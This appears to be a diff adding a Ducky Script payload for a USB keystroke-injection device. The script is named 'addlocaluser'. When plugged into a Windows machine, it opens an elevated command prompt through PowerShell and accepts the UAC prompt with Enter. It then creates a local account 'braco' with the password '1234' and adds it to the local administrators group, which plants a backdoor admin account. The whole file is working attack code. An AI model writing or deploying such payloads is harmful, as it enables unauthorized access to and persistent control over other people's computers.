@@ -1,0 +1,17 @@
+REM addlocaluser
+DELAY 5000
+GUI r
+DELAY 50
+STRING powershell Start-Process cmd -verb runas
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+STRING net user braco 1234 /add
+ENTER
+DELAY 200
+STRING net localgroup administradores Braco /add
+ENTER
+DELAY 200
+STRING exit
+ENTER
